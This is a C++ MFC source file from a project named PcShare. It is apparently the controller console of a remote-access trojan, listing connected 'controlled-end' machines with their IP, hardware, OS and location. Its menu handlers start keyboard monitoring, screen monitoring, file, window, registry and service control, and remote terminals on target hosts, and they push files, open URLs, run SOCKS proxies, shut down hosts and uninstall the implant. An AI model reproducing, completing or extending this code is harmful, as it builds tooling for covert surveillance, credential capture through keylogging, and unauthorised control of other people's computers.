// MyClientManaView.cpp : implementation file
//

#include "stdafx.h"
#include "PcShare.h"
#include "MyClientManaView.h"
#include "MyTopView.h"
#include "MyClientTitleDlg.h"

#include "MySendMessDlg.h"
#include "MySendLinkDlg.h"
#include "MyUpLoadDlg.h"
#include "MyUpdateDlg.h"
#include "MyOpenUrlDlg.h"
#include "MyStartSocksDlg.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMyClientManaView

IMPLEMENT_DYNCREATE(CMyClientManaView, CXTListView)

CMyClientManaView::CMyClientManaView()
{
	m_ExitEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
	hKeepAliveThread = NULL;
}

CMyClientManaView::~CMyClientManaView()
{
	CloseHandle(m_ExitEvent);
}

BEGIN_MESSAGE_MAP(CMyClientManaView, CXTListView)
	//{{AFX_MSG_MAP(CMyClientManaView)
	ON_WM_CREATE()
	ON_WM_SIZE()
	ON_NOTIFY_REFLECT(NM_DBLCLK, OnDblclk)
	ON_NOTIFY_REFLECT(NM_RCLICK, OnRclick)
	ON_COMMAND(ID_CLIENT_MANA_TLNT, OnClientManaTlnt)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_TLNT, OnUpdateClientManaTlnt)
	ON_COMMAND(ID_CLIENT_MANA_UNIN, OnClientManaUnin)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_UNIN, OnUpdateClientManaUnin)
	ON_WM_CONTEXTMENU()
	ON_WM_DESTROY()
	ON_WM_COPYDATA()
	ON_COMMAND(ID_CLIENT_MANA_FILE, OnClientManaFile)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_FILE, OnUpdateClientManaFile)
	ON_COMMAND(ID_CLIENT_MANA_KEYM, OnClientManaKeym)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_KEYM, OnUpdateClientManaKeym)
	ON_COMMAND(ID_CLIENT_MANA_CWND, OnClientManaCwnd)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_CWND, OnUpdateClientManaCwnd)
	ON_COMMAND(ID_CLIENT_MANA_FRAM, OnClientManaFram)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_FRAM, OnUpdateClientManaFram)
	ON_COMMAND(ID_CLIENT_MANA_LINK, OnClientManaLink)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_LINK, OnUpdateClientManaLink)
	ON_COMMAND(ID_CLIENT_MANA_MESS, OnClientManaMess)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_MESS, OnUpdateClientManaMess)
	ON_COMMAND(ID_CLIENT_MANA_MULT, OnClientManaMult)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_MULT, OnUpdateClientManaMult)
	ON_COMMAND(ID_CLIENT_MANA_PROC, OnClientManaProc)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_PROC, OnUpdateClientManaProc)
	ON_COMMAND(ID_CLIENT_MANA_REGT, OnClientManaRegt)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_REGT, OnUpdateClientManaRegt)
	ON_COMMAND(ID_CLIENT_MANA_SERV, OnClientManaServ)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_MANA_SERV, OnUpdateClientManaServ)
	ON_COMMAND(ID_CLIENT_PC_RESTART, OnClientPcRestart)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_PC_RESTART, OnUpdateClientPcRestart)
	ON_COMMAND(ID_CLIENT_PC_SHUTDOWN, OnClientPcShutdown)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_PC_SHUTDOWN, OnUpdateClientPcShutdown)
	ON_COMMAND(ID_CLIENT_UPDATE_FILE, OnClientUpdateFile)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_UPDATE_FILE, OnUpdateClientUpdateFile)
	ON_COMMAND(ID_CLIENT_UPLOAD_FILE, OnClientUploadFile)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_UPLOAD_FILE, OnUpdateClientUploadFile)
	ON_COMMAND(ID_MODIFY_TITLE, OnModifyTitle)
	ON_UPDATE_COMMAND_UI(ID_MODIFY_TITLE, OnUpdateModifyTitle)
	ON_COMMAND(ID_LIST_SELECT_ALL, OnListSelectAll)
	ON_UPDATE_COMMAND_UI(ID_LIST_SELECT_ALL, OnUpdateListSelectAll)
	ON_COMMAND(ID_LIST_SELECT_NOONE, OnListSelectNoone)
	ON_UPDATE_COMMAND_UI(ID_LIST_SELECT_NOONE, OnUpdateListSelectNoone)
	ON_COMMAND(ID_CLIENT_OPEN_URL, OnClientOpenUrl)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_OPEN_URL, OnUpdateClientOpenUrl)
	ON_COMMAND(ID_CLIENT_START_SOCKS, OnClientStartSocks)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_START_SOCKS, OnUpdateClientStartSocks)
	ON_COMMAND(ID_CLIENT_STOP_SOCKS, OnClientStopSocks)
	ON_UPDATE_COMMAND_UI(ID_CLIENT_STOP_SOCKS, OnUpdateClientStopSocks)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_RESIZE_WND, OnResizeWnd)
	ON_MESSAGE(WM_KEEPALIVE, OnKeepAlive)
	ON_MESSAGE(WM_TRANEVENT, OnTranEvent)
	ON_COMMAND_RANGE(ID_VIEW_NORMAL, ID_VIEW_NORMAL + 36, OnViewNormalExt)
	ON_UPDATE_COMMAND_UI_RANGE(ID_VIEW_NORMAL, ID_VIEW_NORMAL + 36, OnUpdateViewNormalExt)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMyClientManaView drawing

void CMyClientManaView::OnDraw(CDC* pDC)
{
	CDocument* pDoc = GetDocument();
	// TODO: add draw code here
}

/////////////////////////////////////////////////////////////////////////////
// CMyClientManaView diagnostics

#ifdef _DEBUG
void CMyClientManaView::AssertValid() const
{
	CXTListView::AssertValid();
}

void CMyClientManaView::Dump(CDumpContext& dc) const
{
	CXTListView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CMyClientManaView message handlers

int CMyClientManaView::OnCreate(LPCREATESTRUCT lpCreateStruct) 
{
	if (CXTListView::OnCreate(lpCreateStruct) == -1)
		return -1;
	
	CListCtrl& lcCountries = GetListCtrl();
	m_imagelist.Create(16, 16, ILC_COLOR24 |ILC_MASK, 6, 6);
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_USERPC));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_VMM));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_LOCK));
	m_imagelist.Add(AfxGetApp()->LoadIcon(IDI_ICON_OPEN));
	lcCountries.SetImageList(&m_imagelist, LVSIL_SMALL);

	AddColumn(_T("被控制端IP地址"), 86, LVCFMT_LEFT);
	AddColumn(_T("软件版本"), 60, LVCFMT_LEFT);
	AddColumn(_T("计算机名"), 60, LVCFMT_LEFT);
	AddColumn(_T("客户注释"), 60, LVCFMT_LEFT);
	AddColumn(_T("操作系统"), 104, LVCFMT_LEFT);
	AddColumn(_T("CPU频率"), 104, LVCFMT_LEFT);
	AddColumn(_T("内存容量"), 104, LVCFMT_LEFT);
	AddColumn(_T("客户所在地域"), 60, LVCFMT_LEFT);
	SetExtendedStyle(LVS_EX_SUBITEMIMAGES|LVS_EX_CHECKBOXES|LVS_EX_FULLROWSELECT|LVS_EX_ONECLICKACTIVATE|LVS_EX_UNDERLINEHOT);
	
	SubclassHeader();

	CListCtrl& listCtrl = GetListCtrl();
	::SendMessage(listCtrl.GetSafeHwnd(), LVM_SETEXTENDEDLISTVIEWSTYLE, 0, LVS_EX_FULLROWSELECT);

	m_flatHeader.SetTheme(new CXTHeaderThemeOffice2003());
	m_flatHeader.ThawAllColumns();
	m_flatHeader.ShowSortArrow(TRUE);
	OnResizeWnd(0, 0);
	return 0;
}

bool CMyClientManaView::SortList(int, bool )
{
	CXTSortClass csc (&GetListCtrl(), m_nSortedCol);
	csc.Sort (m_bAscending, xtSortString);
	return true;
}

void CMyClientManaView::InsertItem(MyServerTran* pItem, BOOL IsShowLogs)
{
	//查看客户是否存在
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
		if(pTran->CheckId(pItem->GetId()))
		{
			pTran->Close();
			delete pTran;
			GetListCtrl().SetItemData(i, (DWORD) pItem);
			GetListCtrl().SetItemText(i, 0, pItem->GetTitle());
			return;
		}
	}

	//设置断开事件
	pItem->SetUnBlock(GetSafeHwnd());
	
	//增加新客户
	int nItem = -1;
	if(pItem->GetLoginInfo()->m_IsVideo)
	{
		nItem = GetListCtrl().InsertItem(
				LVIF_IMAGE | LVIF_PARAM | LVIF_TEXT, 
				2, pItem->GetTitle(),
				INDEXTOSTATEIMAGEMASK(1), 
				LVIS_STATEIMAGEMASK, 1,
				(LPARAM) pItem);
	}
	else
	{
		nItem = GetListCtrl().InsertItem(
				LVIF_IMAGE | LVIF_PARAM | LVIF_TEXT, 
				0, pItem->GetTitle(),
				INDEXTOSTATEIMAGEMASK(1), 
				LVIS_STATEIMAGEMASK, 0,
				(LPARAM) pItem);
	}

	GetListCtrl().SetItemData(nItem, (DWORD) pItem);

	//软件版本
	GetListCtrl().SetItemText(nItem, 1, pItem->GetLoginInfo()->m_SoftVer);

	//计算机名称
	GetListCtrl().SetItemText(nItem, 2, pItem->GetLoginInfo()->m_PcName);
	
	//客户注释
	GetListCtrl().SetItemText(nItem, 3, pItem->GetNote());

	//操作系统版本
	TCHAR m_Text[256] = {0};
	switch(pItem->GetLoginInfo()->m_SysType)
	{
		case Windows2003 : lstrcpy(m_Text, _T("Windows2003")); break;
		case Windows2000 : lstrcpy(m_Text, _T("Windows2000")); break;
		case WindowsXP : lstrcpy(m_Text, _T("WindowsXp")); break;
		case Vista : lstrcpy(m_Text, _T("Vista")); break;
		case Windows7 : lstrcpy(m_Text, _T("Windows7")); break;
		default: lstrcpy(m_Text, _T("未知系统"));break;
	}
	GetListCtrl().SetItemText(nItem, 4, m_Text);

	//CPU频率
	wsprintf(m_Text, _T("~%d Mhz"), pItem->GetLoginInfo()->m_CpuSpeed);
	GetListCtrl().SetItemText(nItem, 5, m_Text);

	//内存容量
	StrFormatByteSize64(pItem->GetLoginInfo()->m_MemContent, m_Text, 256);
	GetListCtrl().SetItemText(nItem, 6, m_Text);

	//所在城市
	GetListCtrl().SetItemText(nItem, 7, pItem->GetRealAddr());

	//查看是否只有一个元素
	if(GetListCtrl().GetItemCount() == 1)
	{
		GetListCtrl().SetItemState(nItem, LVIS_SELECTED, LVIS_SELECTED);
	}
	OnResizeWnd(0, 0);

	//保持连接线程
	if(hKeepAliveThread == NULL)
	{
		hKeepAliveThread = (HANDLE) _beginthread(KeepAliveThread, 0, this);
	}

	if(IsShowLogs)
	{
		//显示连接信息
		wsprintf(m_Text, _T("客户【%s - %s】已经连接 - 所属分组【%s】"), pItem->GetTitle(), pItem->GetLoginInfo()->m_PcName, pItem->GetViewName());
		GetParentFrame()->SendMessage(WM_INSERTLOGS, (WPARAM) m_Text, 0); 
	}
}

void CMyClientManaView::OnSize(UINT nType, int cx, int cy) 
{
	CXTListView::OnSize(nType, cx, cy);
	OnResizeWnd(0, 0);
}

void CMyClientManaView::OnDblclk(NMHDR* pNMHDR, LRESULT* pResult) 
{
	*pResult = 0;
	OnClientManaFile();
}

BOOL CMyClientManaView::PreCreateWindow(CREATESTRUCT& cs) 
{
	cs.style ^= LVS_REPORT|LVS_SINGLESEL|LVS_AUTOARRANGE;
	cs.style &= ~WS_BORDER;
	cs.dwExStyle &= ~WS_EX_CLIENTEDGE;
	return CXTListView::PreCreateWindow(cs);
}

void CMyClientManaView::OnRclick(NMHDR* pNMHDR, LRESULT* pResult) 
{
	*pResult = 0;
	AfxGetMainWnd()->PostMessage(WM_CLIENTMAINRCLICK, IDR_MENU_CLIENT_MANAGER, NULL);
}

LRESULT CMyClientManaView::OnResizeWnd(WPARAM wParam, LPARAM lParam)
{
	CRect rect;
	GetClientRect(&rect);

	GetListCtrl().SetColumnWidth(0, rect.Width() *2/10 - 30);
	GetListCtrl().SetColumnWidth(1, rect.Width() *1/10 + 20);
	GetListCtrl().SetColumnWidth(2, rect.Width() *1/10 - 30);
	GetListCtrl().SetColumnWidth(3, rect.Width() *1/10 + 20);
	GetListCtrl().SetColumnWidth(4, rect.Width() *1/10 - 20);
	GetListCtrl().SetColumnWidth(5, rect.Width() *1/10 - 20);
	GetListCtrl().SetColumnWidth(6, rect.Width() *1/10 - 20);
	GetListCtrl().SetColumnWidth(7, rect.Width() *2/10);
	return TRUE;
}

void CMyClientManaView::SetItemNote(LPCTSTR sNote, LPCTSTR sTitle)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		if(GetListCtrl().GetItemText(i, 0) == sTitle)
		{
			GetListCtrl().SetItemText(i, 3, sNote);
		}
	}
}

MyServerTran* CMyClientManaView::GetItemFromId(LPCTSTR sId)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
		ASSERT(pTran);
		if(StrCmpI(pTran->GetId(), sId) == 0)
		{
			return pTran;
		}
	}
	return NULL;
}

void CMyClientManaView::SetItemPort(LPCTSTR sPort, LPCTSTR sTitle)
{
	int m_Count = GetListCtrl().GetItemCount();
	for(int i = 0; i < m_Count; i++)
	{
		if(GetListCtrl().GetItemText(i, 0) == sTitle)
		{
			GetListCtrl().SetItemText(i, 7, sPort);
		}
	}
}

void CMyClientManaView::OnClientManaTlnt() 
{
	StartChildProcess(_T("超级终端"), WM_CONNECT_TLNT);
}

void CMyClientManaView::OnUpdateClientManaTlnt(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientManaUnin() 
{
	if(MessageBox(_T("确定要卸载被控制端？"), PS_CAOZUO, MB_OKCANCEL|MB_ICONQUESTION) != IDOK)
	{
		return;
	}
	MyServerTran* pItem = GetCurSelect();
	if(pItem != NULL)
	{
		pItem->SendCmd(CLIENT_PRO_UNINSTALL, NULL);
		
		//删除缓冲文件
		TCHAR m_Path[512] = {0};
		GetModuleFileName(NULL, m_Path, 500);
		TCHAR* pFind = StrRChr(m_Path, NULL, _T('\\'));
		ASSERT(pFind);

		*(pFind + 1) = 0;
		lstrcat(m_Path, _T("CACHE\\USERINFO\\"));
		lstrcat(m_Path, pItem->GetId());
		lstrcat(m_Path, _T(".ini"));
		DeleteFile(m_Path);
		return;
	}
}

void CMyClientManaView::OnUpdateClientManaUnin(CCmdUI* pCmdUI) 
{
	pCmdUI->Enable(GetListCtrl().GetSelectedCount() == 1);
}

MyServerTran* CMyClientManaView::GetCurSelect()
{
	if(GetListCtrl().GetSelectedCount() > 0)
	{
		int nItem = GetListCtrl().GetNextItem(-1, LVNI_SELECTED);
		if(nItem == -1)
		{
			return NULL;
		}
		return (MyServerTran*) GetListCtrl().GetItemData(nItem);
	}
	return NULL;
}

void CMyClientManaView::StartChildProcess(LPCTSTR sChildWndName, DWORD nCmd)
{
	int nItem = GetListCtrl().GetNextItem(-1, LVNI_SELECTED);
	if(nItem == -1)
	{
		return;
	}
	
	//设置读过的标识
	LVITEM m_Item = {0};
	m_Item.mask = LVIF_IMAGE;
	m_Item.iItem = nItem;
	m_Item.iSubItem = 2;
	m_Item.iImage = 3;
	GetListCtrl().SetItem(&m_Item);
	MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(nItem);
	if(pItem != NULL)
	{
		StartChildProcess(sChildWndName, nCmd, pItem);
	}
}

void CMyClientManaView::StartChildProcess(LPCTSTR sChildWndName, DWORD nCmd, MyServerTran* pItem)
{
	TCHAR m_Text[256] = {0};
	wsprintf(m_Text, _T(" title=%s%s-%s;clienttitie=%s;id=%s;hwnd=%d;mainhwnd=%d;mainprocess=%d;cmd=%d;"), 
		PS_TITLE, sChildWndName, pItem->GetTitle(), pItem->GetTitle(), pItem->GetId(), GetSafeHwnd(), 
		AfxGetMainWnd()->GetSafeHwnd(), GetCurrentProcessId(), nCmd);

	//启动新的子进程
	TCHAR m_lpCmdLine[512] = {0};
	GetModuleFileName(NULL, m_lpCmdLine, 500);
	lstrcat(m_lpCmdLine, m_Text);

	if(!IsMulitProcess())
	{
		StartMoudle(m_Text);
	}
	else
	{
		STARTUPINFO st = {0};
		st.cb = sizeof(STARTUPINFO);
		PROCESS_INFORMATION pi = {0};
		if(!CreateProcess(NULL, m_lpCmdLine, NULL, NULL, TRUE, 0, NULL, NULL, &st, &pi))
		{
			MessageBox(_T("创建进程失败"), _T("提示"), MB_OK|MB_ICONWARNING);
		}
	}
}

void CMyClientManaView::KeepAlive()
{
	while(WaitForSingleObject(m_ExitEvent, 6000) == WAIT_TIMEOUT)
	{
		SendMessage(WM_KEEPALIVE, 0, 0);
	}
}

void CMyClientManaView::KeepAliveThread(LPVOID lPvoid)
{
	CMyClientManaView* pThis = (CMyClientManaView*) lPvoid;
	pThis->KeepAlive();
}

LRESULT CMyClientManaView::OnTranEvent(WPARAM wParam, LPARAM lParam)
{
	SOCKET s = (SOCKET) wParam;
	WORD nEvent = WSAGETSELECTEVENT(lParam);
	if(nEvent == FD_CLOSE)
	{
		for(int i = 0; i < GetListCtrl().GetItemCount(); i++)
		{
			MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pTran->CheckSocket(s))
			{
				//显示连接信息
				TCHAR m_Text[256] = {0};
				wsprintf(m_Text, _T("客户【%s - %s】已经离线 - 所属分组【%s】"), 
					pTran->GetTitle(), pTran->GetLoginInfo()->m_PcName, pTran->GetViewName());
				GetParentFrame()->SendMessage(WM_INSERTLOGS, (WPARAM) m_Text, 0); 
				pTran->Close();
				delete pTran;
				GetListCtrl().DeleteItem(i);
				return TRUE;
			}
		}
	}
	return TRUE;
}

LRESULT CMyClientManaView::OnKeepAlive(WPARAM wParam, LPARAM lParam)
{
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
		if(pTran != NULL)
		{
			pTran->SendAliveCmd();
		}
	}
	return TRUE;
}

void CMyClientManaView::OnContextMenu(CWnd* pWnd, CPoint point) 
{
	CPoint m_point;
	CMenu m_menu;
	m_menu.LoadMenu(IDR_MENU_FILE_MANA);
	InsertViewMenu((CMenu*) (m_menu.GetSubMenu(0)->GetSubMenu(m_menu.GetSubMenu(0)->GetMenuItemCount() - 1)));
	GetCursorPos(&m_point);
	SetForegroundWindow();   
	CXTPCommandBars::TrackPopupMenu(m_menu.GetSubMenu(0), TPM_RIGHTBUTTON, m_point.x, m_point.y, this);
	m_menu.DestroyMenu();
}

void CMyClientManaView::InsertViewMenu(CMenu* pMenu)
{
	//取PS_FENZUZONGSHU
	TCHAR sViewCount[256] = {0};
	GetPrivateProfileString(PS_SHEZHI, PS_FENZUZONGSHU, _T("0"), sViewCount, 255, GetIniFileName());
	DWORD nViewCount = StrToInt(sViewCount);

	//替换0分组
	TCHAR m_ViewName[256] = {0};
	GetPrivateProfileString(PS_FENZU, _T("0"), PS_PUTONGKEHUZU, m_ViewName, 255, GetIniFileName());
	pMenu->ModifyMenu(MF_BYPOSITION, 0, MF_STRING, m_ViewName);

	//增加其他分组
	int k = ID_VIEW_NORMAL + 1;
	for(DWORD i = 1; i < nViewCount; i++)
	{
		TCHAR m_ViewCount[256] = {0};
		wsprintf(m_ViewCount, _T("%d"), i);
		GetPrivateProfileString(PS_FENZU, m_ViewCount, m_ViewCount, m_ViewName, 255, GetIniFileName());
		pMenu->AppendMenu(MF_STRING, k, m_ViewName);
		k++;
	}
}

void CMyClientManaView::OnDestroy() 
{
	SetEvent(m_ExitEvent);
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
		pTran->Close();
		delete pTran;
	}
	CXTListView::OnDestroy();
}

void CMyClientManaView::OnUpdateViewNormalExt(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnViewNormalExt(UINT nID) 
{
	CMyTopView* pParentView = (CMyTopView*) GetOwner();
	int i = 0, k = 0;
	int nId = nID - ID_VIEW_NORMAL;
	CString m_SrcViewName = pParentView->GetCurViewName();
	CString m_DesViewName = pParentView->GetViewNameFromId(nId);
	if(m_SrcViewName == m_DesViewName)
	{
		return;
	}

	//移动到目标分组
	int nCheckCount = 0;
	int nCount = GetListCtrl().GetItemCount();
	for(i = 0; i < nCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			pItem->SetViewName(m_DesViewName);
			SetUserInfo(pItem->GetId(), pItem->GetViewName(), PS_INFO_VIEW);
			pParentView->GetViewFromId(nId)->InsertItem(pItem, FALSE);
			nCheckCount ++;
		}
	}

	//从视删除
	for(i = 0; i < nCheckCount; i++)
	{
		for(k = 0; k < GetListCtrl().GetItemCount(); k++)
		{
			if(GetListCtrl().GetCheck(k))
			{
				GetListCtrl().DeleteItem(k);
				break;
			}
		}
	}

	//单个
	int nSelectCount = GetListCtrl().GetSelectedCount();
	if(nCheckCount == 0 && nSelectCount == 1)
	{
		int nItem = GetListCtrl().GetNextItem(-1, LVNI_SELECTED);
		if(nItem == -1)
		{
			return;
		}
		MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(nItem);
		pItem->SetViewName(m_DesViewName);
		SetUserInfo(pItem->GetId(), pItem->GetViewName(), PS_INFO_VIEW);
		pParentView->GetViewFromId(nId)->InsertItem(pItem, FALSE);
		GetListCtrl().DeleteItem(nItem);
	}
}

BOOL CMyClientManaView::OnCopyData(CWnd* pWnd, COPYDATASTRUCT* pCopyDataStruct) 
{
	if(pCopyDataStruct->dwData == PS_LOCAL_SENDCMD)
	{
		LPMYCHILDCMDINFO pInfo = (LPMYCHILDCMDINFO) pCopyDataStruct->lpData;
		int iCount = GetListCtrl().GetItemCount();
		for(int i = 0; i < iCount; i++)
		{
			MyServerTran* pTran = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pTran->CheckId(pInfo->m_Id))
			{
				pTran->SendCmd(pInfo->m_Info.m_Command, pInfo->m_Info.m_Hwnd);
			}
		}
	}
	return CXTListView::OnCopyData(pWnd, pCopyDataStruct);
}

void CMyClientManaView::OnClientManaFile() 
{
	StartChildProcess(_T("文件管理"), WM_CONNECT_FILE);
}

void CMyClientManaView::OnUpdateClientManaFile(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
}

void CMyClientManaView::OnClientManaKeym() 
{
	StartChildProcess(_T("键盘监控"), WM_CONNECT_GET_KEY);
}

void CMyClientManaView::OnUpdateClientManaKeym(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaCwnd() 
{
	StartChildProcess(_T("窗口管理"), WM_CONNECT_CWND);
}

void CMyClientManaView::OnUpdateClientManaCwnd(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaFram() 
{
	StartChildProcess(_T("屏幕监控"), WM_CONNECT_FRAM);
}

void CMyClientManaView::OnUpdateClientManaFram(CCmdUI* pCmdUI) 
{
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaLink() 
{
	CMySendLinkDlg dlg(this);
	TCHAR m_TitleName[512] = {0};
	GetPrivateProfileString(_T("保存"), _T("指定网页"), _T(""), m_TitleName, 256, GetIniFileName());
	dlg.m_Title = m_TitleName + 1;
	if(dlg.DoModal() != IDOK) 
	{
		return;
	}
	lstrcpy(m_TitleName + 1, dlg.m_Title);
	if(dlg.m_Type == 0)
	{
		m_TitleName[0] = _T('0');
	}
	else if(dlg.m_Type == 1)
	{
		m_TitleName[0] = _T('1');
	}
	WritePrivateProfileString(_T("保存"), _T("指定网页"), m_TitleName, GetIniFileName());

	char* pData = new char[lstrlen(m_TitleName) + 1024];

	WideCharToMultiByte(CP_ACP, 0, m_TitleName, lstrlen(m_TitleName) + 1, pData, lstrlen(m_TitleName) + 1024, NULL, NULL);

	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s连接管理"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return;
	}

	//填充结构
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = lstrlen(m_TitleName);
	ct.dwData = PS_LOCAL_SEND_LINK;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	int nCheckCount = 0;

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pItem != NULL)
			{
				pItem->SendCmd(WM_CONNECT_LINK, NULL);
			}
			nCheckCount ++;
		}
	}


	if(nCheckCount == 0)
	{
		MyServerTran* pItem = GetCurSelect();
		if(pItem != NULL)
		{
			pItem->SendCmd(WM_CONNECT_LINK, NULL);
		}
	}
}

void CMyClientManaView::OnUpdateClientManaLink(CCmdUI* pCmdUI) 
{
	int count = GetListCtrl().GetSelectedCount();
	if(GetListCtrl().GetSelectedCount() == 1)
	{
		pCmdUI->Enable(TRUE);
		return;
	}
	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			pCmdUI->Enable(TRUE);
			return;
		}
	}
	pCmdUI->Enable(FALSE);
	
}

void CMyClientManaView::OnClientManaMess() 
{
	TCHAR m_TitleName[512] = {0};
	GetPrivateProfileString(_T("保存"), _T("提示信息"), _T(""), m_TitleName, 256, GetIniFileName());
	CMySendMessDlg dlg;
	dlg.m_Title = m_TitleName + 1;
	if(dlg.DoModal() != IDOK)
	{
		return;
	}
	lstrcpy(m_TitleName + 1, dlg.m_Title);
	if(dlg.m_Type == 0)
	{
		m_TitleName[0] = _T('0');
	}
	else if(dlg.m_Type == 1)
	{
		m_TitleName[0] = _T('1');
	}
	else
	{
		m_TitleName[0] = _T('2');
	}
	WritePrivateProfileString(_T("保存"), _T("提示信息"), m_TitleName, GetIniFileName());

	char* pData = new char[lstrlen(m_TitleName) + 1024];
	WideCharToMultiByte(CP_ACP, 0, m_TitleName, lstrlen(m_TitleName) + 1, pData, lstrlen(m_TitleName) + 1024, NULL, NULL);

	TCHAR nCWndName[256] = {0};
	wsprintf(nCWndName, _T("%s连接管理"), PS_TITLE);
	HWND hWnd = ::FindWindow(NULL, nCWndName);
	if(hWnd == NULL)
	{
		delete [] pData;
		return ;
	}

	//填充结构
	COPYDATASTRUCT ct = {0};
	ct.lpData = pData;
	ct.cbData = lstrlen(m_TitleName);
	ct.dwData = PS_LOCAL_SEND_MESS;
	if(!::SendMessage(hWnd, WM_COPYDATA, 0, (LPARAM) &ct))
	{
		delete [] pData;
		return ;
	}
	delete [] pData;

	int nCheckCount = 0;

	int iCount = GetListCtrl().GetItemCount();
	for(int i = 0; i < iCount; i++)
	{
		if(GetListCtrl().GetCheck(i))
		{
			MyServerTran* pItem = (MyServerTran*) GetListCtrl().GetItemData(i);
			if(pItem != NULL)
			{
				pItem->SendCmd(WM_CONNECT_MESS, NULL);
			}
			nCheckCount ++;
		}
	}


	if(nCheckCount == 0)
	{
		MyServerTran* pItem = GetCurSelect();
		if(pItem != NULL)
		{
			pItem->SendCmd(WM_CONNECT_MESS, NULL);
		}
	}
}

